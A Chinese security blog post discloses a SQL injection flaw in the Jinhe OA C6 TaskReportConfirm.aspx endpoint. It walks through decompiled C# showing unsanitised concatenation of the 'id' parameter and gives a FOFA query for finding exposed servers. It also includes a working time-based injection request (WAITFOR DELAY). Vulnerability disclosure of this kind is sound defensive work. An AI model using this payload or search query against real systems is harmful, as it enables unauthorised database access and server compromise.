---
title: "金和OA TaskReportConfirm.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-TaskReportConfirm-id-sqli.html
asset_dir: assets/金和oa-taskreportconfirm.aspx-sql注入漏洞
---

# 金和OA TaskReportConfirm.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/10 12:37
- 1347浏览
- [2评论](#comment)
- 29分钟阅读

深入探索

云安全解决方案

传输层安全性协议

漏洞扫描服务

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `TaskReportConfirm.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 TaskReportConfirm.aspx 的实现，在 bin 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `TaskReportConfirm` 的处理逻辑

```
  protected void Page_Load(object sender, EventArgs e)
  {
    if (this.Request["id"] != null)
      this.ReportID = this.Request["id"].ToString();
    if (this.Session["UserCode"] != null)
      this.UserID = this.Session["UserCode"].ToString();
    if (!this.IsPostBack)
      this.GetTaskReport();
    this.Globalization();
  }
```

再跟进 `GetTaskReport` 方法，其实现如下

代码安全审计

```
  private void GetTaskReport()
  {
    DataTable dataTable = Common.ExecSqlReDt($"select top 1 a.*,b.TaskID,b.TaskName,b.TaskExecutorID,b.TaskOthersID,b.TaskViewRegCode from TaskManageExecutorsay a inner join Taskmanage b on a.TaskID = b.TaskID where ID = '{this.ReportID}'");
    if (((InternalDataCollectionBase) dataTable.Rows).Count <= 0)
      return;
    this.txtTaskReportExplain.Value = dataTable.Rows[0]["TaskConfirmExplain"].ToString();
    ((Control) this).ViewState["TaskID"] = (object) dataTable.Rows[0]["TaskID"].ToString();
    ((Control) this).ViewState["TaskName"] = (object) dataTable.Rows[0]["TaskName"].ToString();
    ((Control) this).ViewState["TaskExecs"] = (object) $"{dataTable.Rows[0]["TaskExecutorID"].ToString()},{dataTable.Rows[0]["TaskOthersID"].ToString()}";
    ((Control) this).ViewState["TaskViewers"] = (object) dataTable.Rows[0]["TaskViewRegCode"].ToString();
  }
```

参数 `ReportID` 被直接拼接进 `ExecSqlReDt` SQL语句中执行，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。

在页面提交确认通过或不通过时，也存在SQL注入

[![金和OA TaskReportConfirm.aspx SQL注入漏洞](images/img-001-de27b9681d00.webp)](https://image.mrxn.net/017c4bcc084e4e36831dac4cc2884555.webp)

可以进入 `ConfirmTaskReport` 方法后，还可能进入 `ProjectTaskConfirm` 方法，二者均是存在sql注入的，其中 `ConfirmTaskReport` 方法实现如下

漏洞扫描服务

```
public bool ConfirmTaskReport(
    string ReportID,
    string strUserID,
    string strConfirmFlag,
    string strExplain)
  {
    string QueryString = $" update TaskManageExecutorsay set TaskConfirmFlag = '{strConfirmFlag}',TaskConfirmExplain = '{strExplain}' where ID = '{ReportID}' ";
    if (string.op_Equality(strConfirmFlag, "1"))
      QueryString = $"{QueryString} declare @TaskID int,@TaskReportProgress decimal(8, 1),@SubHours decimal(18, 1)   select @TaskID = TaskID,@TaskReportProgress=taskrrecfinprogress,@SubHours=TaskRCost from TaskManageExecutorsay where ID = '{ReportID}'   update TaskManage set TaskWorkHour= TaskWorkHour + @SubHours where TaskID=@TaskID   exec pt_TaskReportProgress @TaskID,@TaskReportProgress ";
    DBOperator dbOperator = DBOperatorFactory.GetDBOperator();
    dbOperator.ExecSQLReInt(QueryString);
```

# 漏洞复现

```
POST /c6/Jhsoft.Web.dailytaskmanage/TaskReportConfirm.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

id='WAitFor DelaY'0:0:5'--
```

[![金和OA TaskReportConfirm.aspx SQL注入漏洞](images/img-002-a3d91710b8e0.webp)](https://image.mrxn.net/4e77284c27304cb29e815cfa9a7805f9.webp)

成功延时 5 秒钟

编程

ConfirmTaskReport

[![金和OA TaskReportConfirm.aspx SQL注入漏洞](images/img-003-f14b50f0a0b5.webp)](https://image.mrxn.net/7e170741a052469e88b3388f1d1c56ed.webp)

成功延时 10 秒（执行两次），还有其他参数也存在同样的[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
